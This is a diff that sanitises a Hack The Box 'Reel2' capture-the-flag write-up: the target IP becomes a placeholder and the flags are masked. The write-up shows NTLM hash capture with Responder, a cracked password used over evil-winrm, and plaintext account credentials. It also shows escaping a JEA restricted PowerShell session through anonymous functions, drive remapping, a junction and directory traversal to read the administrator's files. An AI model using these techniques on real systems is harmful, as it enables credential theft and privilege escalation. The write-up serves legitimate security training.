@@ -13,8 +13,6 @@ htb_url: https://app.hackthebox.com/machines/Reel2
 
 ### Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-reel2-infocard.png)
-
 This machine was not as difficult in some respects as other Hard-difficulty machines, but the way that the machine was realistically hardened made it more challenging.  The use of some newer Windows PowerShell hardening techniques, as well as ensuring authentication was required in a key location put this machine into the "hard" category.  The path to root was otherwise rather straightforward, and just required simple attention to detail and some research to keep moving forward.
 
 ## Useful Skills and Tools
@@ -49,7 +47,7 @@ cd D:\Administrator
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.210`. The options I regularly use are:
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are:
 
 | `Flag` | Purpose |
 | :--- | :--- |
@@ -61,7 +59,7 @@ I started my enumeration with an nmap scan of `10.10.10.210`. The options I regu
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
-└─$ nmap -sCV -n -p- -Pn -v -oA reel2 10.10.10.210                                               130 ⨯
+└─$ nmap -sCV -n -p- -Pn -v -oA reel2 <YOUR_IP>                                               130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 12:16 EST
 NSE: Loaded 153 scripts for scanning.
@@ -73,38 +71,38 @@ Completed NSE at 12:16, 0.00s elapsed
 Initiating NSE at 12:16
 Completed NSE at 12:16, 0.00s elapsed
 Initiating Connect Scan at 12:16
-Scanning 10.10.10.210 [65535 ports]
-Discovered open port 443/tcp on 10.10.10.210
-Discovered open port 8080/tcp on 10.10.10.210
-Discovered open port 80/tcp on 10.10.10.210
-Discovered open port 6007/tcp on 10.10.10.210
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 443/tcp on <YOUR_IP>
+Discovered open port 8080/tcp on <YOUR_IP>
+Discovered open port 80/tcp on <YOUR_IP>
+Discovered open port 6007/tcp on <YOUR_IP>
 Connect Scan Timing: About 19.17% done; ETC: 12:19 (0:02:11 remaining)
-Discovered open port 6008/tcp on 10.10.10.210
-Discovered open port 6011/tcp on 10.10.10.210
-Discovered open port 6005/tcp on 10.10.10.210
-Discovered open port 6027/tcp on 10.10.10.210
-Discovered open port 6004/tcp on 10.10.10.210
+Discovered open port 6008/tcp on <YOUR_IP>
+Discovered open port 6011/tcp on <YOUR_IP>
+Discovered open port 6005/tcp on <YOUR_IP>
+Discovered open port 6027/tcp on <YOUR_IP>
+Discovered open port 6004/tcp on <YOUR_IP>
 Connect Scan Timing: About 47.11% done; ETC: 12:18 (0:01:08 remaining)
-Discovered open port 6006/tcp on 10.10.10.210
-Discovered open port 5985/tcp on 10.10.10.210
-Discovered open port 6010/tcp on 10.10.10.210
-Discovered open port 6002/tcp on 10.10.10.210
-Discovered open port 6012/tcp on 10.10.10.210
-Discovered open port 6001/tcp on 10.10.10.210
-Discovered open port 6017/tcp on 10.10.10.210
+Discovered open port 6006/tcp on <YOUR_IP>
+Discovered open port 5985/tcp on <YOUR_IP>
+Discovered open port 6010/tcp on <YOUR_IP>
+Discovered open port 6002/tcp on <YOUR_IP>
+Discovered open port 6012/tcp on <YOUR_IP>
+Discovered open port 6001/tcp on <YOUR_IP>
+Discovered open port 6017/tcp on <YOUR_IP>
 Completed Connect Scan at 12:18, 106.29s elapsed (65535 total ports)
 Initiating Service scan at 12:18
-Scanning 16 services on 10.10.10.210
+Scanning 16 services on <YOUR_IP>
 Service scan Timing: About 56.25% done; ETC: 12:20 (0:00:43 remaining)
 Completed Service scan at 12:19, 59.77s elapsed (16 services on 1 host)
-NSE: Script scanning 10.10.10.210.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 12:19
 Completed NSE at 12:20, 67.52s elapsed
 Initiating NSE at 12:20
 Completed NSE at 12:20, 7.31s elapsed
 Initiating NSE at 12:20
 Completed NSE at 12:20, 0.00s elapsed
-Nmap scan report for 10.10.10.210
+Nmap scan report for <YOUR_IP>
 Host is up (0.069s latency).
 Not shown: 65519 filtered ports
 PORT     STATE SERVICE    VERSION
@@ -360,7 +358,6 @@ I used Google translate to send an email inviting everyone to check out the new 
   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
   To kill this script hit CTRL-C
 
-
 [+] Poisoners:
     LLMNR                      [ON]
     NBT-NS                     [ON]
@@ -401,10 +398,8 @@ I used Google translate to send an email inviting everyone to check out the new 
     Challenge set              [random]
     Don't Respond To Names     ['ISATAP']
 
-
-
 [+] Listening for events...
-[HTTP] NTLMv2 Client   : 10.10.10.210
+[HTTP] NTLMv2 Client   : <YOUR_IP>
 [HTTP] NTLMv2 Username : htb\k.svensson
 [HTTP] NTLMv2 Hash     : k.svensson::htb:85ab412763d672f9:83648271C68CBDA4E17F73B1EF3CD357:0101000000000000D97F28DCB804D7017D151A1EDFF498E3000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000400000C4BECD0E51B4B90084B5CB9F237CDCDD2221F1DA0BE28E374F512A2DF5FA7A400A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310035002E00310033000000000000000000
 ```
@@ -482,7 +477,7 @@ I was able to crack the hash in just a few seconds. `k.svensson`'s password was 
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
-└─$ evil-winrm -u k.svensson -p kittycat1 -i 10.10.10.210                                          1 ⨯
+└─$ evil-winrm -u k.svensson -p kittycat1 -i <YOUR_IP>                                          1 ⨯
 
 Evil-WinRM shell v2.3
 
@@ -513,7 +508,7 @@ Type 'help' to get help.
    Upgrade now, or check out the release page at:       
      https://aka.ms/PowerShell-Release?tag=v7.1.2       
 
-PS /home/zweilos/htb/reel2> $newSession = New-PSSession -ComputerName 10.10.10.210 -Credential HTB\k.svensson -Authentication Negotiate                                                                       
+PS /home/zweilos/htb/reel2> $newSession = New-PSSession -ComputerName <YOUR_IP> -Credential HTB\k.svensson -Authentication Negotiate                                                                       
 
 PowerShell credential request
 Enter your credentials.                                                                                
@@ -528,14 +523,14 @@ I was able to login after using `pwsh` and PowerShell remoting.
 NOTE: If you get the below error, close PowerShell, then install **`gss-ntlmssp`**. This will allow you to use NTLM authentication.
 
 ```text
-New-PSSession: [10.10.10.210] Connecting to remote server 10.10.10.210 failed with the following error message : acquiring creds with username only failed Unspecified GSS failure.  Minor code may provide more information SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.
+New-PSSession: [<YOUR_IP>] Connecting to remote server <YOUR_IP> failed with the following error message : acquiring creds with username only failed Unspecified GSS failure.  Minor code may provide more information SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.
 ```
 
 * [https://www.reddit.com/r/PowerShell/comments/6itek2/powershell\_remoting\_linux\_windows\_with\_spnego/dj9auuq/](https://www.reddit.com/r/PowerShell/comments/6itek2/powershell_remoting_linux_windows_with_spnego/dj9auuq/) 
 {% endhint %}
 
 ```text
-[10.10.10.210]: PS>whoami /all
+[<YOUR_IP>]: PS>whoami /all
 The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
 program. Check the spelling of the name, or if a path was included, verify that the path is correct 
 and try again.
@@ -546,21 +541,20 @@ and try again.
 I tried using the `whoami` command to find out what groups and permissions I had access to, but it didn't seem to be able to available.  This was another bad sign, after so many other locked down things.
 
 ```text
-[10.10.10.210]: P> function test {whoami}   
+[<YOUR_IP>]: P> function test {whoami}   
 htb\k.svensson
 ```
 
 After some testing, I discovered I could run commands embedded inside a custom function.
 
 ```text
-[10.10.10.210]: PS>function test {whoami /all}
+[<YOUR_IP>]: PS>function test {whoami /all}
 USER INFORMATION
 ----------------
 
 User Name      SID                                          
 ============== =============================================
 htb\k.svensson S-1-5-21-158661246-3153678129-2567348495-1165
-
 
 GROUP INFORMATION
 -----------------
@@ -576,7 +570,6 @@ NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandat
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                    
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -585,7 +578,6 @@ Privilege Name                Description                    State
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -602,11 +594,9 @@ This seemed to be pretty well locked down as well.  There wasn't much to work wi
 I found a shortcut for running commands inside short functions like this by using anonymous functions.
 
 ```text
-[10.10.10.210]: P> .{ls}
-
+[<YOUR_IP>]: P> .{ls}
 
     Directory: C:\Users\k.svensson\Documents
-
 
 Mode                LastWriteTime         Length Name                                                 
 ----                -------------         ------ ----                                                 
@@ -657,9 +647,8 @@ Now if only I could gain access to an Administrator account...
 ### User.txt
 
 ```text
-[10.10.10.210]: P> .{cd ..\Desktop/} 
+[<YOUR_IP>]: P> .{cd ..\Desktop/} 
     Directory: C:\Users\k.svensson\Desktop
-
 
 Mode                LastWriteTime         Length Name                                                 
 ----                -------------         ------ ----                                                 
@@ -669,9 +658,8 @@ d-----        2/12/2021   5:12 PM                WinDirStatPortable
 -a----         2/8/2021   5:54 PM        2591096 Sysmon64.exe                                         
 -ar---        2/15/2021  11:33 PM             34 user.txt
 
-
-[10.10.10.210]: P> .{type user.txt}
-88fe9f1ba18d0a89e4b67277fba820de
+[<YOUR_IP>]: P> .{type user.txt}
+****
 ```
 
 On `k.svensson`'s Desktop I found the `user.txt` proof file.
@@ -683,7 +671,7 @@ On `k.svensson`'s Desktop I found the `user.txt` proof file.
 On the desktop I also saw a link for the sticky notes program, which seemed like a good place to search for secrets.  I searched the user's folder for any files that referenced "sticky" to see what I could find.
 
 ```text
-[10.10.10.210]: PS>.{dir -r C:\Users\k.svensson\ -EA Silent | Select-String "sticky"}
+[<YOUR_IP>]: PS>.{dir -r C:\Users\k.svensson\ -EA Silent | Select-String "sticky"}
 
 Sticky Notes.lnk:1:L�F�@ �m�Bcf��m�Bcf��4��V�02DG
 ▒Yr?�D��U��k0�%��Ucf�t�cf��tCFSF1�P9ZAppDatat▒Y^���H�g3��(����ߟgVA�
@@ -702,9 +690,6 @@ Data\Local\Programs\stickynotesFC:\Users\k.svensson
 %USERPROFILE%\AppDa
 ta\Local\Programs\stickynotes\stickynotes.exe
 
-
-
-
 �|��I�J�H��K�2
 `�Xreel2�R�CJ��I�mE��jk���UH����
                                 )/��R�CJ��I�mE��jk���UH����
@@ -721,14 +706,14 @@ The Sticky Notes application was installed in `%USERPROFILE%\AppData\Local\Progr
 NOTE: I lost my shell at one point so it hung on any commands. If you get the below error after a hung PowerShell PSSession, use the shortcut Ctrl-L to exit and return to your local prompt.
 
 ```text
-[10.10.10.210]: PS>Starting a command on the remote server failed with the following error message : ERROR_WSMAN_INVALID_SELECTORS: The WS-Management service cannot process the request because the request contained invalid selectors for the resource.  For more information, see the about_Remote_Troubleshooting Help topic.
+[<YOUR_IP>]: PS>Starting a command on the remote server failed with the following error message : ERROR_WSMAN_INVALID_SELECTORS: The WS-Management service cannot process the request because the request contained invalid selectors for the resource.  For more information, see the about_Remote_Troubleshooting Help topic.
 ```
 
 Results may vary with this. For me, it did not fully work, and I had to kill the terminal entirely.
 {% endhint %}
 
 ```text
-[10.10.10.210]: P> .{Get-ComputerInfo}                                                                 
+[<YOUR_IP>]: P> .{Get-ComputerInfo}                                                                 
                                                                                                                                                                                                               WindowsBuildLabEx                                       : 9600.19812.amd64fre.winblue_ltsb_escrow.2008                                                           14-1823                                      
 WindowsCurrentVersion                                   : 6.3
 WindowsEditionId                                        : ServerStandard
@@ -773,9 +758,8 @@ I was denied using the `systeminfo` command, but `Get-ComputerInfo` gave me a li
 There didn't seem to be anything in the `Appdata\Local\stickynotes\` folder of use, so I checked `Roaming` to see if there was anything useful there
 
 ```text
-[10.10.10.210]: PS>.{cd ../../../Roaming}
+[<YOUR_IP>]: PS>.{cd ../../../Roaming}
     Directory: C:\Users\k.svensson\AppData\Roaming
-
 
 Mode                LastWriteTime         Length Name                                                 
 ----                -------------         ------ ----                                                 
@@ -784,10 +768,8 @@ d---s-        7/30/2020   2:43 PM                Microsoft
 d-----        7/30/2020   2:27 PM                Mozilla                                              
 d-----        7/30/2020   1:23 PM                stickynotes                                          
 
-
-[10.10.10.210]: PS>.{cd stickynotes}     
+[<YOUR_IP>]: PS>.{cd stickynotes}     
     Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes
-
 
 Mode                LastWriteTime         Length Name                                                 
 ----                -------------         ------ ----                                                 
@@ -805,29 +787,24 @@ d-----        7/30/2020   1:19 PM                logs
 There were a number of files and folders that looked interesting in this folder.  I tried searching for a database or storage file where the notes may have been contained.
 
 ```text
-[10.10.10.210]: PS>.{cd logs}       
-[10.10.10.210]: PS>.{cd ..\blob_storage}                                                 
+[<YOUR_IP>]: PS>.{cd logs}       
+[<YOUR_IP>]: PS>.{cd ..\blob_storage}                                                 
     Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes\blob_storage
-
 
 Mode                LastWriteTime         Length Name                                                 
 ----                -------------         ------ ----                                                 
 d-----        2/16/2021   5:08 PM                034a85de-dd17-4c80-a8ba-034bfb90026f                 
 
-
-[10.10.10.210]: PS>.{cd .\034a85de-dd17-4c80-a8ba-034bfb90026f/}
-[10.10.10.210]: PS>.{cd '..\..\Local Storage/'}                 
+[<YOUR_IP>]: PS>.{cd .\034a85de-dd17-4c80-a8ba-034bfb90026f/}
+[<YOUR_IP>]: PS>.{cd '..\..\Local Storage/'}                 
     Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage
-
 
 Mode                LastWriteTime         Length Name                                                 
 ----                -------------         ------ ----                                                 
 d-----        2/16/2021   5:08 PM                leveldb                                              
 
-
-[10.10.10.210]: PS>.{cd leveldb}                                
+[<YOUR_IP>]: PS>.{cd leveldb}                                
     Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb
-
 
 Mode                LastWriteTime         Length Name                                                 
 ----                -------------         ------ ----                                                 
@@ -846,7 +823,7 @@ Inside the `\stickynotes\Local Storage` folder there was a `leveldb` folder. Aft
 I did some research to see if I could find out anything about this kind of custom set up for this program, and found that there was a community of people who preferred the old Sticky Notes program, and worked out ways to install and run it locally.  It looked possible that this project had been implemented here.
 
 ```text
-[10.10.10.210]: P> .{type Log.old}
+[<YOUR_IP>]: P> .{type Log.old}
 2021/02/12-16:58:37.478 5956 Reusing MANIFEST leveldb/MANIFEST-000001
 2021/02/12-16:58:37.478 5956 Recovering log #3
 2021/02/12-16:58:37.479 5956 Reusing old log leveldb/000003.log
@@ -855,7 +832,7 @@ I did some research to see if I could find out anything about this kind of custo
 First I checked `Log.old` to see if there was anything useful, but it just pointed towards the other log file `000003.log`in the same directory.
 
 ```text
-[10.10.10.210]: PS>.{type 000003.log}
+[<YOUR_IP>]: PS>.{type 000003.log}
 /á€uBVERSION1
              META:app://.app://.__storejs__test__Z’–9[
                                                       META:app://.
@@ -970,23 +947,23 @@ Type 'help' to get help.
 PS /home/zweilos/htb/reel2> $user = "jea_test_account"
 PS /home/zweilos/htb/reel2> $pass = ConvertTo-SecureString "Ab!Q@vcg^%@#1" -AsPlainText 
 PS /home/zweilos/htb/reel2> $creds = new-object -typename System.Management.Automation.PSCredential -argumentlist ($user, $pass)                    
-PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession 10.10.10.210 -Credential $creds -Authentication Negotiate
-New-PSSession: [10.10.10.210] Connecting to remote server 10.10.10.210 failed with the following error message : ERROR_ACCESS_DENIED: Access is denied.  For more information, see the about_Remote_Troubleshooting Help topic.                                                                                      
-PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession 10.10.10.210 -Credential $creds -Authentication Negotiate -ConfigurationName "jea_test_account"                                                       
+PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession <YOUR_IP> -Credential $creds -Authentication Negotiate
+New-PSSession: [<YOUR_IP>] Connecting to remote server <YOUR_IP> failed with the following error message : ERROR_ACCESS_DENIED: Access is denied.  For more information, see the about_Remote_Troubleshooting Help topic.                                                                                      
+PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession <YOUR_IP> -Credential $creds -Authentication Negotiate -ConfigurationName "jea_test_account"                                                       
 PS /home/zweilos/htb/reel2> Enter-PSSession $jeaSession
 ```
 
 After creating an object with the credentials and specifying the connection with the configuration name, I was able to connect.
 
 ```text
-[10.10.10.210]: P> whoami /all
+[<YOUR_IP>]: P> whoami /all
 The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
 program. Check the spelling of the name, or if a path was included, verify that the path is correct 
 and try again.
     + CategoryInfo          : ObjectNotFound: (whoami.exe:String) [], CommandNotFoundException
     + FullyQualifiedErrorId : CommandNotFoundException
 
-[10.10.10.210]: P> .{whoami /all}
+[<YOUR_IP>]: P> .{whoami /all}
 The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
     + CategoryInfo          : ParserError: (.{whoami /all}:String) [], ParseException
     + FullyQualifiedErrorId : ScriptsNotAllowed
@@ -1015,8 +992,7 @@ Function        Measure-Object
 Function        Out-Default                                                                           
 Function        Select-Object                                                                         
 
-
-[10.10.10.210]: PS>Get-Help Check-File
+[<YOUR_IP>]: PS>Get-Help Check-File
 Cannot find path '' because it does not exist.
     + CategoryInfo          : ObjectNotFound: (:) [Get-Help], ItemNotFoundException
     + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetHelpCommand
@@ -1025,7 +1001,7 @@ Cannot find path '' because it does not exist.
 I used `Get-Command` to see what commands I had access to, and found that it was pretty much the same list as before with one addition.  I tried to access the help information for the `Check-File` command, but I got a `Cannot find path` error.
 
 ```bash
-[10.10.10.210]: P> .{type jea_test_account.psrc}
+[<YOUR_IP>]: P> .{type jea_test_account.psrc}
 @{
 
 # ID used to uniquely identify this document
@@ -1100,7 +1076,7 @@ FunctionDefinitions = @{
 This function runs the `Get-Content` cmdlet, but first checks to see if the path of the file supplied contains `D:\` or `C:\ProgramData\`, and only works if this is true. It seems that there must be some file in these directories that would hopefully point me in the right direction.
 
 ```bash
-[10.10.10.210]: PS>.{type jea_test_account.pssc}
+[<YOUR_IP>]: PS>.{type jea_test_account.pssc}
 @{
 
 # Version number of the schema used for this document
@@ -1139,7 +1115,7 @@ LanguageMode = 'NoLanguage'
 The second configuration file confirmed my suspicions that I had been locked into `NoLanguage` mode, which explained why I couldn't use custom functions anymore.
 
 ```text
-[10.10.10.210]: P> .{cd D:\}
+[<YOUR_IP>]: P> .{cd D:\}
 cd : Cannot find drive. A drive with the name 'D' does not exist.
 At line:1 char:3                                                                                       
 + .{cd D:\}                                                                                            
@@ -1158,26 +1134,23 @@ I did some research on how to use PowerShell to link files and how to mount new 
 * [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.1)
 
 ```text
-[10.10.10.210]: P> .{New-PSDrive -Name "D" -PsProvider "FileSystem" -Root "C:\"}                       
+[<YOUR_IP>]: P> .{New-PSDrive -Name "D" -PsProvider "FileSystem" -Root "C:\"}                       
 
 Name           Used (GB)     Free (GB) Provider      Root                                CurrentLocati
                                                                                                     on
 ----           ---------     --------- --------      ----                                -------------
 D                                      FileSystem    C:\                                              
 
-
-[10.10.10.210]: P> .{cd D:\}
+[<YOUR_IP>]: P> .{cd D:\}
 ```
 
 Using this, I was able to create a `D:\` drive that linked to all of the folders and files in the `C:\` drive.
 
 ```text
-[10.10.10.210]: P> .{cd D:\Users}
-[10.10.10.210]: P> .{ls}
-
+[<YOUR_IP>]: P> .{cd D:\Users}
+[<YOUR_IP>]: P> .{ls}
 
     Directory: C:\Users
-
 
 Mode                LastWriteTime         Length Name                                                 
 ----                -------------         ------ ----                                                 
@@ -1194,7 +1167,7 @@ I was able to link the C drive to the D drive letter as the `k.svensson` user, h
 * [https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell](https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell)
 
 ```text
-[10.10.10.210]: PS>.{New-Item -Path C:\ProgramData\Administrator\ -ItemType SymbolicLink -Value C:\Users\Administrator\}                                                                                      
+[<YOUR_IP>]: PS>.{New-Item -Path C:\ProgramData\Administrator\ -ItemType SymbolicLink -Value C:\Users\Administrator\}                                                                                      
 New-Item : Administrator privilege required for this operation.
 At line:1 char:3                                                                                       
 + .{New-Item -Path C:\ProgramData\Administrator\ -ItemType SymbolicLink ...                            
@@ -1208,11 +1181,9 @@ At line:1 char:3
 Instead I tried mounting the `C:\Users\Administrator\` into the other folder listed in the `Check-File` script, `C:\ProgramData\`.  I did not have permissions to link to the `/Administrator` folder directly.
 
 ```text
-[10.10.10.210]: PS>.{New-Item -Path C:\ProgramData\Desk\ -ItemType Junction -Value C:\Users\Administrator\}                                                                                                   
-
+[<YOUR_IP>]: PS>.{New-Item -Path C:\ProgramData\Desk\ -ItemType Junction -Value C:\Users\Administrator\}                                                                                                   
 
     Directory: C:\ProgramData
-
 
 Mode                LastWriteTime         Length Name                                                 
 ----                -------------         ------ ----                                                 
@@ -1224,8 +1195,8 @@ Instead, I created a new folder inside `C:\ProgramData\` called `\Desk` which li
 ### Root.txt
 
 ```text
-[10.10.10.210]: PS>Check-File C:\ProgramData\Desk\Desktop\root.txt                                     
-e145465135ac264800cee7d8dda0dbba
+[<YOUR_IP>]: PS>Check-File C:\ProgramData\Desk\Desktop\root.txt                                     
+****
 ```
 
 I was then able to use `Check-File` to read the contents of the `root.txt` by referencing the linked version inside `C:\ProgramData\Desk\Desktop\`.  
@@ -1235,15 +1206,11 @@ I was then able to use `Check-File` to read the contents of the `root.txt` by re
 After going through all of the trouble to create a link to the folders, I realized that I could also do it much more simply...with directory traversal!
 
 ```text
-[10.10.10.210]: PS>Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt
+[<YOUR_IP>]: PS>Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt
 
-e145465135ac264800cee7d8dda0dbba
+****
 ```
 
 Since the custom function was looking for a path with the `-Like` parameter and a `*` wildcard, anything could be put after the path `C:\ProgramData\`. This includes directory traversal paths such as `..\`. 
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-reel2-pwned.png)
-
-Thanks to [`cube0x0`](https://app.hackthebox.eu/users/9164) for creating this fun and interesting machine!  I had read about JEA when it first came out, but I didn't understand how powerfully restrictive it could be \(at least if configured securely!\).  Thank you for this opportunity to learn how to bypass these protections so I can better learn how to configure Windows networks to be more secure!
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
